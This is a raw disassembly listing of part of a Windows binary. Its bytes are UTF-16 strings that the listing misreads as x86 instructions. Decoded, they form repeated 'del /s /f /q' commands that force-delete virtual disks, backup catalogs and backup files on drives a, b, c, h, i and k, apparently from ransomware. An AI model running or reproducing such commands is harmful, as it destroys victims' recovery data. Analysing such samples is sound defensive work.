  404d73:	00 63 00             	add    %ah,0x0(%ebx)
  404d76:	20 00                	and    %al,(%eax)
  404d78:	68 00 3a 00 5c       	push   $0x5c003a00
  404d7d:	00 2a                	add    %ch,(%edx)
  404d7f:	00 2e                	add    %ch,(%esi)
  404d81:	00 62 00             	add    %ah,0x0(%edx)
  404d84:	61                   	popa
  404d85:	00 6b 00             	add    %ch,0x0(%ebx)
  404d88:	20 00                	and    %al,(%eax)
  404d8a:	68 00 3a 00 5c       	push   $0x5c003a00
  404d8f:	00 2a                	add    %ch,(%edx)
  404d91:	00 2e                	add    %ch,(%esi)
  404d93:	00 77 00             	add    %dh,0x0(%edi)
  404d96:	62 00                	bound  %eax,(%eax)
  404d98:	63 00                	arpl   %eax,(%eax)
  404d9a:	61                   	popa
  404d9b:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  404d9f:	00 68 00             	add    %ch,0x0(%eax)
  404da2:	3a 00                	cmp    (%eax),%al
  404da4:	5c                   	pop    %esp
  404da5:	00 2a                	add    %ch,(%edx)
  404da7:	00 2e                	add    %ch,(%esi)
  404da9:	00 62 00             	add    %ah,0x0(%edx)
  404dac:	6b 00 66             	imul   $0x66,(%eax),%eax
  404daf:	00 20                	add    %ah,(%eax)
  404db1:	00 68 00             	add    %ch,0x0(%eax)
  404db4:	3a 00                	cmp    (%eax),%al
  404db6:	5c                   	pop    %esp
  404db7:	00 42 00             	add    %al,0x0(%edx)
  404dba:	61                   	popa
  404dbb:	00 63 00             	add    %ah,0x0(%ebx)
  404dbe:	6b 00 75             	imul   $0x75,(%eax),%eax
  404dc1:	00 70 00             	add    %dh,0x0(%eax)
  404dc4:	2a 00                	sub    (%eax),%al
  404dc6:	2e 00 2a             	add    %ch,%cs:(%edx)
  404dc9:	00 20                	add    %ah,(%eax)
  404dcb:	00 68 00             	add    %ch,0x0(%eax)
  404dce:	3a 00                	cmp    (%eax),%al
  404dd0:	5c                   	pop    %esp
  404dd1:	00 62 00             	add    %ah,0x0(%edx)
  404dd4:	61                   	popa
  404dd5:	00 63 00             	add    %ah,0x0(%ebx)
  404dd8:	6b 00 75             	imul   $0x75,(%eax),%eax
  404ddb:	00 70 00             	add    %dh,0x0(%eax)
  404dde:	2a 00                	sub    (%eax),%al
  404de0:	2e 00 2a             	add    %ch,%cs:(%edx)
  404de3:	00 20                	add    %ah,(%eax)
  404de5:	00 68 00             	add    %ch,0x0(%eax)
  404de8:	3a 00                	cmp    (%eax),%al
  404dea:	5c                   	pop    %esp
  404deb:	00 2a                	add    %ch,(%edx)
  404ded:	00 2e                	add    %ch,(%esi)
  404def:	00 73 00             	add    %dh,0x0(%ebx)
  404df2:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  404df7:	00 68 00             	add    %ch,0x0(%eax)
  404dfa:	3a 00                	cmp    (%eax),%al
  404dfc:	5c                   	pop    %esp
  404dfd:	00 2a                	add    %ch,(%edx)
  404dff:	00 2e                	add    %ch,(%esi)
  404e01:	00 77 00             	add    %dh,0x0(%edi)
  404e04:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  404e0a:	68 00 3a 00 5c       	push   $0x5c003a00
  404e0f:	00 2a                	add    %ch,(%edx)
  404e11:	00 2e                	add    %ch,(%esi)
  404e13:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  404e17:	00 6b 00             	add    %ch,0x0(%ebx)
  404e1a:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  404e20:	00 20                	add    %ah,(%eax)
  404e22:	00 20                	add    %ah,(%eax)
  404e24:	00 20                	add    %ah,(%eax)
  404e26:	00 20                	add    %ah,(%eax)
  404e28:	00 20                	add    %ah,(%eax)
  404e2a:	00 20                	add    %ah,(%eax)
  404e2c:	00 20                	add    %ah,(%eax)
  404e2e:	00 20                	add    %ah,(%eax)
  404e30:	00 20                	add    %ah,(%eax)
  404e32:	00 20                	add    %ah,(%eax)
  404e34:	00 20                	add    %ah,(%eax)
  404e36:	00 20                	add    %ah,(%eax)
  404e38:	00 20                	add    %ah,(%eax)
  404e3a:	00 20                	add    %ah,(%eax)
  404e3c:	00 20                	add    %ah,(%eax)
  404e3e:	00 20                	add    %ah,(%eax)
  404e40:	00 20                	add    %ah,(%eax)
  404e42:	00 20                	add    %ah,(%eax)
  404e44:	00 20                	add    %ah,(%eax)
  404e46:	00 20                	add    %ah,(%eax)
  404e48:	00 20                	add    %ah,(%eax)
  404e4a:	00 20                	add    %ah,(%eax)
  404e4c:	00 20                	add    %ah,(%eax)
  404e4e:	00 20                	add    %ah,(%eax)
  404e50:	00 20                	add    %ah,(%eax)
  404e52:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  404e56:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  404e5a:	00 2f                	add    %ch,(%edi)
  404e5c:	00 73 00             	add    %dh,0x0(%ebx)
  404e5f:	20 00                	and    %al,(%eax)
  404e61:	2f                   	das
  404e62:	00 66 00             	add    %ah,0x0(%esi)
  404e65:	20 00                	and    %al,(%eax)
  404e67:	2f                   	das
  404e68:	00 71 00             	add    %dh,0x0(%ecx)
  404e6b:	20 00                	and    %al,(%eax)
  404e6d:	61                   	popa
  404e6e:	00 3a                	add    %bh,(%edx)
  404e70:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404e74:	00 2e                	add    %ch,(%esi)
  404e76:	00 56 00             	add    %dl,0x0(%esi)
  404e79:	48                   	dec    %eax
  404e7a:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  404e7e:	00 61 00             	add    %ah,0x0(%ecx)
  404e81:	3a 00                	cmp    (%eax),%al
  404e83:	5c                   	pop    %esp
  404e84:	00 2a                	add    %ch,(%edx)
  404e86:	00 2e                	add    %ch,(%esi)
  404e88:	00 62 00             	add    %ah,0x0(%edx)
  404e8b:	61                   	popa
  404e8c:	00 63 00             	add    %ah,0x0(%ebx)
  404e8f:	20 00                	and    %al,(%eax)
  404e91:	61                   	popa
  404e92:	00 3a                	add    %bh,(%edx)
  404e94:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404e98:	00 2e                	add    %ch,(%esi)
  404e9a:	00 62 00             	add    %ah,0x0(%edx)
  404e9d:	61                   	popa
  404e9e:	00 6b 00             	add    %ch,0x0(%ebx)
  404ea1:	20 00                	and    %al,(%eax)
  404ea3:	61                   	popa
  404ea4:	00 3a                	add    %bh,(%edx)
  404ea6:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404eaa:	00 2e                	add    %ch,(%esi)
  404eac:	00 77 00             	add    %dh,0x0(%edi)
  404eaf:	62 00                	bound  %eax,(%eax)
  404eb1:	63 00                	arpl   %eax,(%eax)
  404eb3:	61                   	popa
  404eb4:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  404eb8:	00 61 00             	add    %ah,0x0(%ecx)
  404ebb:	3a 00                	cmp    (%eax),%al
  404ebd:	5c                   	pop    %esp
  404ebe:	00 2a                	add    %ch,(%edx)
  404ec0:	00 2e                	add    %ch,(%esi)
  404ec2:	00 62 00             	add    %ah,0x0(%edx)
  404ec5:	6b 00 66             	imul   $0x66,(%eax),%eax
  404ec8:	00 20                	add    %ah,(%eax)
  404eca:	00 61 00             	add    %ah,0x0(%ecx)
  404ecd:	3a 00                	cmp    (%eax),%al
  404ecf:	5c                   	pop    %esp
  404ed0:	00 42 00             	add    %al,0x0(%edx)
  404ed3:	61                   	popa
  404ed4:	00 63 00             	add    %ah,0x0(%ebx)
  404ed7:	6b 00 75             	imul   $0x75,(%eax),%eax
  404eda:	00 70 00             	add    %dh,0x0(%eax)
  404edd:	2a 00                	sub    (%eax),%al
  404edf:	2e 00 2a             	add    %ch,%cs:(%edx)
  404ee2:	00 20                	add    %ah,(%eax)
  404ee4:	00 61 00             	add    %ah,0x0(%ecx)
  404ee7:	3a 00                	cmp    (%eax),%al
  404ee9:	5c                   	pop    %esp
  404eea:	00 62 00             	add    %ah,0x0(%edx)
  404eed:	61                   	popa
  404eee:	00 63 00             	add    %ah,0x0(%ebx)
  404ef1:	6b 00 75             	imul   $0x75,(%eax),%eax
  404ef4:	00 70 00             	add    %dh,0x0(%eax)
  404ef7:	2a 00                	sub    (%eax),%al
  404ef9:	2e 00 2a             	add    %ch,%cs:(%edx)
  404efc:	00 20                	add    %ah,(%eax)
  404efe:	00 61 00             	add    %ah,0x0(%ecx)
  404f01:	3a 00                	cmp    (%eax),%al
  404f03:	5c                   	pop    %esp
  404f04:	00 2a                	add    %ch,(%edx)
  404f06:	00 2e                	add    %ch,(%esi)
  404f08:	00 73 00             	add    %dh,0x0(%ebx)
  404f0b:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  404f10:	00 61 00             	add    %ah,0x0(%ecx)
  404f13:	3a 00                	cmp    (%eax),%al
  404f15:	5c                   	pop    %esp
  404f16:	00 2a                	add    %ch,(%edx)
  404f18:	00 2e                	add    %ch,(%esi)
  404f1a:	00 77 00             	add    %dh,0x0(%edi)
  404f1d:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  404f23:	61                   	popa
  404f24:	00 3a                	add    %bh,(%edx)
  404f26:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  404f2a:	00 2e                	add    %ch,(%esi)
  404f2c:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  404f30:	00 6b 00             	add    %ch,0x0(%ebx)
  404f33:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  404f39:	00 20                	add    %ah,(%eax)
  404f3b:	00 20                	add    %ah,(%eax)
  404f3d:	00 20                	add    %ah,(%eax)
  404f3f:	00 20                	add    %ah,(%eax)
  404f41:	00 20                	add    %ah,(%eax)
  404f43:	00 20                	add    %ah,(%eax)
  404f45:	00 20                	add    %ah,(%eax)
  404f47:	00 20                	add    %ah,(%eax)
  404f49:	00 20                	add    %ah,(%eax)
  404f4b:	00 20                	add    %ah,(%eax)
  404f4d:	00 20                	add    %ah,(%eax)
  404f4f:	00 20                	add    %ah,(%eax)
  404f51:	00 20                	add    %ah,(%eax)
  404f53:	00 20                	add    %ah,(%eax)
  404f55:	00 20                	add    %ah,(%eax)
  404f57:	00 20                	add    %ah,(%eax)
  404f59:	00 20                	add    %ah,(%eax)
  404f5b:	00 20                	add    %ah,(%eax)
  404f5d:	00 20                	add    %ah,(%eax)
  404f5f:	00 20                	add    %ah,(%eax)
  404f61:	00 20                	add    %ah,(%eax)
  404f63:	00 20                	add    %ah,(%eax)
  404f65:	00 20                	add    %ah,(%eax)
  404f67:	00 20                	add    %ah,(%eax)
  404f69:	00 20                	add    %ah,(%eax)
  404f6b:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  404f6f:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  404f73:	00 2f                	add    %ch,(%edi)
  404f75:	00 73 00             	add    %dh,0x0(%ebx)
  404f78:	20 00                	and    %al,(%eax)
  404f7a:	2f                   	das
  404f7b:	00 66 00             	add    %ah,0x0(%esi)
  404f7e:	20 00                	and    %al,(%eax)
  404f80:	2f                   	das
  404f81:	00 71 00             	add    %dh,0x0(%ecx)
  404f84:	20 00                	and    %al,(%eax)
  404f86:	62 00                	bound  %eax,(%eax)
  404f88:	3a 00                	cmp    (%eax),%al
  404f8a:	5c                   	pop    %esp
  404f8b:	00 2a                	add    %ch,(%edx)
  404f8d:	00 2e                	add    %ch,(%esi)
  404f8f:	00 56 00             	add    %dl,0x0(%esi)
  404f92:	48                   	dec    %eax
  404f93:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  404f97:	00 62 00             	add    %ah,0x0(%edx)
  404f9a:	3a 00                	cmp    (%eax),%al
  404f9c:	5c                   	pop    %esp
  404f9d:	00 2a                	add    %ch,(%edx)
  404f9f:	00 2e                	add    %ch,(%esi)
  404fa1:	00 62 00             	add    %ah,0x0(%edx)
  404fa4:	61                   	popa
  404fa5:	00 63 00             	add    %ah,0x0(%ebx)
  404fa8:	20 00                	and    %al,(%eax)
  404faa:	62 00                	bound  %eax,(%eax)
  404fac:	3a 00                	cmp    (%eax),%al
  404fae:	5c                   	pop    %esp
  404faf:	00 2a                	add    %ch,(%edx)
  404fb1:	00 2e                	add    %ch,(%esi)
  404fb3:	00 62 00             	add    %ah,0x0(%edx)
  404fb6:	61                   	popa
  404fb7:	00 6b 00             	add    %ch,0x0(%ebx)
  404fba:	20 00                	and    %al,(%eax)
  404fbc:	62 00                	bound  %eax,(%eax)
  404fbe:	3a 00                	cmp    (%eax),%al
  404fc0:	5c                   	pop    %esp
  404fc1:	00 2a                	add    %ch,(%edx)
  404fc3:	00 2e                	add    %ch,(%esi)
  404fc5:	00 77 00             	add    %dh,0x0(%edi)
  404fc8:	62 00                	bound  %eax,(%eax)
  404fca:	63 00                	arpl   %eax,(%eax)
  404fcc:	61                   	popa
  404fcd:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  404fd1:	00 62 00             	add    %ah,0x0(%edx)
  404fd4:	3a 00                	cmp    (%eax),%al
  404fd6:	5c                   	pop    %esp
  404fd7:	00 2a                	add    %ch,(%edx)
  404fd9:	00 2e                	add    %ch,(%esi)
  404fdb:	00 62 00             	add    %ah,0x0(%edx)
  404fde:	6b 00 66             	imul   $0x66,(%eax),%eax
  404fe1:	00 20                	add    %ah,(%eax)
  404fe3:	00 62 00             	add    %ah,0x0(%edx)
  404fe6:	3a 00                	cmp    (%eax),%al
  404fe8:	5c                   	pop    %esp
  404fe9:	00 42 00             	add    %al,0x0(%edx)
  404fec:	61                   	popa
  404fed:	00 63 00             	add    %ah,0x0(%ebx)
  404ff0:	6b 00 75             	imul   $0x75,(%eax),%eax
  404ff3:	00 70 00             	add    %dh,0x0(%eax)
  404ff6:	2a 00                	sub    (%eax),%al
  404ff8:	2e 00 2a             	add    %ch,%cs:(%edx)
  404ffb:	00 20                	add    %ah,(%eax)
  404ffd:	00 62 00             	add    %ah,0x0(%edx)
  405000:	3a 00                	cmp    (%eax),%al
  405002:	5c                   	pop    %esp
  405003:	00 62 00             	add    %ah,0x0(%edx)
  405006:	61                   	popa
  405007:	00 63 00             	add    %ah,0x0(%ebx)
  40500a:	6b 00 75             	imul   $0x75,(%eax),%eax
  40500d:	00 70 00             	add    %dh,0x0(%eax)
  405010:	2a 00                	sub    (%eax),%al
  405012:	2e 00 2a             	add    %ch,%cs:(%edx)
  405015:	00 20                	add    %ah,(%eax)
  405017:	00 62 00             	add    %ah,0x0(%edx)
  40501a:	3a 00                	cmp    (%eax),%al
  40501c:	5c                   	pop    %esp
  40501d:	00 2a                	add    %ch,(%edx)
  40501f:	00 2e                	add    %ch,(%esi)
  405021:	00 73 00             	add    %dh,0x0(%ebx)
  405024:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  405029:	00 62 00             	add    %ah,0x0(%edx)
  40502c:	3a 00                	cmp    (%eax),%al
  40502e:	5c                   	pop    %esp
  40502f:	00 2a                	add    %ch,(%edx)
  405031:	00 2e                	add    %ch,(%esi)
  405033:	00 77 00             	add    %dh,0x0(%edi)
  405036:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  40503c:	62 00                	bound  %eax,(%eax)
  40503e:	3a 00                	cmp    (%eax),%al
  405040:	5c                   	pop    %esp
  405041:	00 2a                	add    %ch,(%edx)
  405043:	00 2e                	add    %ch,(%esi)
  405045:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  405049:	00 6b 00             	add    %ch,0x0(%ebx)
  40504c:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  405052:	00 20                	add    %ah,(%eax)
  405054:	00 20                	add    %ah,(%eax)
  405056:	00 20                	add    %ah,(%eax)
  405058:	00 20                	add    %ah,(%eax)
  40505a:	00 20                	add    %ah,(%eax)
  40505c:	00 20                	add    %ah,(%eax)
  40505e:	00 20                	add    %ah,(%eax)
  405060:	00 20                	add    %ah,(%eax)
  405062:	00 20                	add    %ah,(%eax)
  405064:	00 20                	add    %ah,(%eax)
  405066:	00 20                	add    %ah,(%eax)
  405068:	00 20                	add    %ah,(%eax)
  40506a:	00 20                	add    %ah,(%eax)
  40506c:	00 20                	add    %ah,(%eax)
  40506e:	00 20                	add    %ah,(%eax)
  405070:	00 20                	add    %ah,(%eax)
  405072:	00 20                	add    %ah,(%eax)
  405074:	00 20                	add    %ah,(%eax)
  405076:	00 20                	add    %ah,(%eax)
  405078:	00 20                	add    %ah,(%eax)
  40507a:	00 20                	add    %ah,(%eax)
  40507c:	00 20                	add    %ah,(%eax)
  40507e:	00 20                	add    %ah,(%eax)
  405080:	00 20                	add    %ah,(%eax)
  405082:	00 20                	add    %ah,(%eax)
  405084:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  405088:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40508c:	00 2f                	add    %ch,(%edi)
  40508e:	00 73 00             	add    %dh,0x0(%ebx)
  405091:	20 00                	and    %al,(%eax)
  405093:	2f                   	das
  405094:	00 66 00             	add    %ah,0x0(%esi)
  405097:	20 00                	and    %al,(%eax)
  405099:	2f                   	das
  40509a:	00 71 00             	add    %dh,0x0(%ecx)
  40509d:	20 00                	and    %al,(%eax)
  40509f:	63 00                	arpl   %eax,(%eax)
  4050a1:	3a 00                	cmp    (%eax),%al
  4050a3:	5c                   	pop    %esp
  4050a4:	00 2a                	add    %ch,(%edx)
  4050a6:	00 2e                	add    %ch,(%esi)
  4050a8:	00 56 00             	add    %dl,0x0(%esi)
  4050ab:	48                   	dec    %eax
  4050ac:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  4050b0:	00 63 00             	add    %ah,0x0(%ebx)
  4050b3:	3a 00                	cmp    (%eax),%al
  4050b5:	5c                   	pop    %esp
  4050b6:	00 2a                	add    %ch,(%edx)
  4050b8:	00 2e                	add    %ch,(%esi)
  4050ba:	00 62 00             	add    %ah,0x0(%edx)
  4050bd:	61                   	popa
  4050be:	00 63 00             	add    %ah,0x0(%ebx)
  4050c1:	20 00                	and    %al,(%eax)
  4050c3:	63 00                	arpl   %eax,(%eax)
  4050c5:	3a 00                	cmp    (%eax),%al
  4050c7:	5c                   	pop    %esp
  4050c8:	00 2a                	add    %ch,(%edx)
  4050ca:	00 2e                	add    %ch,(%esi)
  4050cc:	00 62 00             	add    %ah,0x0(%edx)
  4050cf:	61                   	popa
  4050d0:	00 6b 00             	add    %ch,0x0(%ebx)
  4050d3:	20 00                	and    %al,(%eax)
  4050d5:	63 00                	arpl   %eax,(%eax)
  4050d7:	3a 00                	cmp    (%eax),%al
  4050d9:	5c                   	pop    %esp
  4050da:	00 2a                	add    %ch,(%edx)
  4050dc:	00 2e                	add    %ch,(%esi)
  4050de:	00 77 00             	add    %dh,0x0(%edi)
  4050e1:	62 00                	bound  %eax,(%eax)
  4050e3:	63 00                	arpl   %eax,(%eax)
  4050e5:	61                   	popa
  4050e6:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  4050ea:	00 63 00             	add    %ah,0x0(%ebx)
  4050ed:	3a 00                	cmp    (%eax),%al
  4050ef:	5c                   	pop    %esp
  4050f0:	00 2a                	add    %ch,(%edx)
  4050f2:	00 2e                	add    %ch,(%esi)
  4050f4:	00 62 00             	add    %ah,0x0(%edx)
  4050f7:	6b 00 66             	imul   $0x66,(%eax),%eax
  4050fa:	00 20                	add    %ah,(%eax)
  4050fc:	00 63 00             	add    %ah,0x0(%ebx)
  4050ff:	3a 00                	cmp    (%eax),%al
  405101:	5c                   	pop    %esp
  405102:	00 42 00             	add    %al,0x0(%edx)
  405105:	61                   	popa
  405106:	00 63 00             	add    %ah,0x0(%ebx)
  405109:	6b 00 75             	imul   $0x75,(%eax),%eax
  40510c:	00 70 00             	add    %dh,0x0(%eax)
  40510f:	2a 00                	sub    (%eax),%al
  405111:	2e 00 2a             	add    %ch,%cs:(%edx)
  405114:	00 20                	add    %ah,(%eax)
  405116:	00 63 00             	add    %ah,0x0(%ebx)
  405119:	3a 00                	cmp    (%eax),%al
  40511b:	5c                   	pop    %esp
  40511c:	00 62 00             	add    %ah,0x0(%edx)
  40511f:	61                   	popa
  405120:	00 63 00             	add    %ah,0x0(%ebx)
  405123:	6b 00 75             	imul   $0x75,(%eax),%eax
  405126:	00 70 00             	add    %dh,0x0(%eax)
  405129:	2a 00                	sub    (%eax),%al
  40512b:	2e 00 2a             	add    %ch,%cs:(%edx)
  40512e:	00 20                	add    %ah,(%eax)
  405130:	00 63 00             	add    %ah,0x0(%ebx)
  405133:	3a 00                	cmp    (%eax),%al
  405135:	5c                   	pop    %esp
  405136:	00 2a                	add    %ch,(%edx)
  405138:	00 2e                	add    %ch,(%esi)
  40513a:	00 73 00             	add    %dh,0x0(%ebx)
  40513d:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  405142:	00 63 00             	add    %ah,0x0(%ebx)
  405145:	3a 00                	cmp    (%eax),%al
  405147:	5c                   	pop    %esp
  405148:	00 2a                	add    %ch,(%edx)
  40514a:	00 2e                	add    %ch,(%esi)
  40514c:	00 77 00             	add    %dh,0x0(%edi)
  40514f:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  405155:	63 00                	arpl   %eax,(%eax)
  405157:	3a 00                	cmp    (%eax),%al
  405159:	5c                   	pop    %esp
  40515a:	00 2a                	add    %ch,(%edx)
  40515c:	00 2e                	add    %ch,(%esi)
  40515e:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  405162:	00 6b 00             	add    %ch,0x0(%ebx)
  405165:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  40516b:	00 20                	add    %ah,(%eax)
  40516d:	00 20                	add    %ah,(%eax)
  40516f:	00 20                	add    %ah,(%eax)
  405171:	00 20                	add    %ah,(%eax)
  405173:	00 20                	add    %ah,(%eax)
  405175:	00 20                	add    %ah,(%eax)
  405177:	00 20                	add    %ah,(%eax)
  405179:	00 20                	add    %ah,(%eax)
  40517b:	00 20                	add    %ah,(%eax)
  40517d:	00 20                	add    %ah,(%eax)
  40517f:	00 20                	add    %ah,(%eax)
  405181:	00 20                	add    %ah,(%eax)
  405183:	00 20                	add    %ah,(%eax)
  405185:	00 20                	add    %ah,(%eax)
  405187:	00 20                	add    %ah,(%eax)
  405189:	00 20                	add    %ah,(%eax)
  40518b:	00 20                	add    %ah,(%eax)
  40518d:	00 20                	add    %ah,(%eax)
  40518f:	00 20                	add    %ah,(%eax)
  405191:	00 20                	add    %ah,(%eax)
  405193:	00 20                	add    %ah,(%eax)
  405195:	00 20                	add    %ah,(%eax)
  405197:	00 20                	add    %ah,(%eax)
  405199:	00 20                	add    %ah,(%eax)
  40519b:	00 20                	add    %ah,(%eax)
  40519d:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4051a1:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4051a5:	00 2f                	add    %ch,(%edi)
  4051a7:	00 73 00             	add    %dh,0x0(%ebx)
  4051aa:	20 00                	and    %al,(%eax)
  4051ac:	2f                   	das
  4051ad:	00 66 00             	add    %ah,0x0(%esi)
  4051b0:	20 00                	and    %al,(%eax)
  4051b2:	2f                   	das
  4051b3:	00 71 00             	add    %dh,0x0(%ecx)
  4051b6:	20 00                	and    %al,(%eax)
  4051b8:	69 00 3a 00 5c 00    	imul   $0x5c003a,(%eax),%eax
  4051be:	2a 00                	sub    (%eax),%al
  4051c0:	2e 00 56 00          	add    %dl,%cs:0x0(%esi)
  4051c4:	48                   	dec    %eax
  4051c5:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  4051c9:	00 69 00             	add    %ch,0x0(%ecx)
  4051cc:	3a 00                	cmp    (%eax),%al
  4051ce:	5c                   	pop    %esp
  4051cf:	00 2a                	add    %ch,(%edx)
  4051d1:	00 2e                	add    %ch,(%esi)
  4051d3:	00 62 00             	add    %ah,0x0(%edx)
  4051d6:	61                   	popa
  4051d7:	00 63 00             	add    %ah,0x0(%ebx)
  4051da:	20 00                	and    %al,(%eax)
  4051dc:	69 00 3a 00 5c 00    	imul   $0x5c003a,(%eax),%eax
  4051e2:	2a 00                	sub    (%eax),%al
  4051e4:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  4051e8:	61                   	popa
  4051e9:	00 6b 00             	add    %ch,0x0(%ebx)
  4051ec:	20 00                	and    %al,(%eax)
  4051ee:	69 00 3a 00 5c 00    	imul   $0x5c003a,(%eax),%eax
  4051f4:	2a 00                	sub    (%eax),%al
  4051f6:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  4051fa:	62 00                	bound  %eax,(%eax)
  4051fc:	63 00                	arpl   %eax,(%eax)
  4051fe:	61                   	popa
  4051ff:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  405203:	00 69 00             	add    %ch,0x0(%ecx)
  405206:	3a 00                	cmp    (%eax),%al
  405208:	5c                   	pop    %esp
  405209:	00 2a                	add    %ch,(%edx)
  40520b:	00 2e                	add    %ch,(%esi)
  40520d:	00 62 00             	add    %ah,0x0(%edx)
  405210:	6b 00 66             	imul   $0x66,(%eax),%eax
  405213:	00 20                	add    %ah,(%eax)
  405215:	00 69 00             	add    %ch,0x0(%ecx)
  405218:	3a 00                	cmp    (%eax),%al
  40521a:	5c                   	pop    %esp
  40521b:	00 42 00             	add    %al,0x0(%edx)
  40521e:	61                   	popa
  40521f:	00 63 00             	add    %ah,0x0(%ebx)
  405222:	6b 00 75             	imul   $0x75,(%eax),%eax
  405225:	00 70 00             	add    %dh,0x0(%eax)
  405228:	2a 00                	sub    (%eax),%al
  40522a:	2e 00 2a             	add    %ch,%cs:(%edx)
  40522d:	00 20                	add    %ah,(%eax)
  40522f:	00 69 00             	add    %ch,0x0(%ecx)
  405232:	3a 00                	cmp    (%eax),%al
  405234:	5c                   	pop    %esp
  405235:	00 62 00             	add    %ah,0x0(%edx)
  405238:	61                   	popa
  405239:	00 63 00             	add    %ah,0x0(%ebx)
  40523c:	6b 00 75             	imul   $0x75,(%eax),%eax
  40523f:	00 70 00             	add    %dh,0x0(%eax)
  405242:	2a 00                	sub    (%eax),%al
  405244:	2e 00 2a             	add    %ch,%cs:(%edx)
  405247:	00 20                	add    %ah,(%eax)
  405249:	00 69 00             	add    %ch,0x0(%ecx)
  40524c:	3a 00                	cmp    (%eax),%al
  40524e:	5c                   	pop    %esp
  40524f:	00 2a                	add    %ch,(%edx)
  405251:	00 2e                	add    %ch,(%esi)
  405253:	00 73 00             	add    %dh,0x0(%ebx)
  405256:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  40525b:	00 69 00             	add    %ch,0x0(%ecx)
  40525e:	3a 00                	cmp    (%eax),%al
  405260:	5c                   	pop    %esp
  405261:	00 2a                	add    %ch,(%edx)
  405263:	00 2e                	add    %ch,(%esi)
  405265:	00 77 00             	add    %dh,0x0(%edi)
  405268:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  40526e:	69 00 3a 00 5c 00    	imul   $0x5c003a,(%eax),%eax
  405274:	2a 00                	sub    (%eax),%al
  405276:	2e 00 64 00 73       	add    %ah,%cs:0x73(%eax,%eax,1)
  40527b:	00 6b 00             	add    %ch,0x0(%ebx)
  40527e:	00 81 17 20 00 20    	add    %al,0x20002017(%ecx)
  405284:	00 20                	add    %ah,(%eax)
  405286:	00 20                	add    %ah,(%eax)
  405288:	00 20                	add    %ah,(%eax)
  40528a:	00 20                	add    %ah,(%eax)
  40528c:	00 20                	add    %ah,(%eax)
  40528e:	00 20                	add    %ah,(%eax)
  405290:	00 20                	add    %ah,(%eax)
  405292:	00 20                	add    %ah,(%eax)
  405294:	00 20                	add    %ah,(%eax)
  405296:	00 20                	add    %ah,(%eax)
  405298:	00 20                	add    %ah,(%eax)
  40529a:	00 20                	add    %ah,(%eax)
  40529c:	00 20                	add    %ah,(%eax)
  40529e:	00 20                	add    %ah,(%eax)
  4052a0:	00 20                	add    %ah,(%eax)
  4052a2:	00 20                	add    %ah,(%eax)
  4052a4:	00 20                	add    %ah,(%eax)
  4052a6:	00 20                	add    %ah,(%eax)
  4052a8:	00 20                	add    %ah,(%eax)
  4052aa:	00 20                	add    %ah,(%eax)
  4052ac:	00 20                	add    %ah,(%eax)
  4052ae:	00 20                	add    %ah,(%eax)
  4052b0:	00 20                	add    %ah,(%eax)
  4052b2:	00 20                	add    %ah,(%eax)
  4052b4:	00 20                	add    %ah,(%eax)
  4052b6:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  4052ba:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  4052be:	00 2f                	add    %ch,(%edi)
  4052c0:	00 73 00             	add    %dh,0x0(%ebx)
  4052c3:	20 00                	and    %al,(%eax)
  4052c5:	2f                   	das
  4052c6:	00 66 00             	add    %ah,0x0(%esi)
  4052c9:	20 00                	and    %al,(%eax)
  4052cb:	2f                   	das
  4052cc:	00 71 00             	add    %dh,0x0(%ecx)
  4052cf:	20 00                	and    %al,(%eax)
  4052d1:	6b 00 3a             	imul   $0x3a,(%eax),%eax
  4052d4:	00 5c 00 2a          	add    %bl,0x2a(%eax,%eax,1)
  4052d8:	00 2e                	add    %ch,(%esi)
  4052da:	00 56 00             	add    %dl,0x0(%esi)
  4052dd:	48                   	dec    %eax
  4052de:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  4052e2:	00 6b 00             	add    %ch,0x0(%ebx)
  4052e5:	3a 00                	cmp    (%eax),%al
  4052e7:	5c                   	pop    %esp
  4052e8:	00 2a                	add    %ch,(%edx)
  4052ea:	00 2e                	add    %ch,(%esi)
  4052ec:	00 62 00             	add    %ah,0x0(%edx)
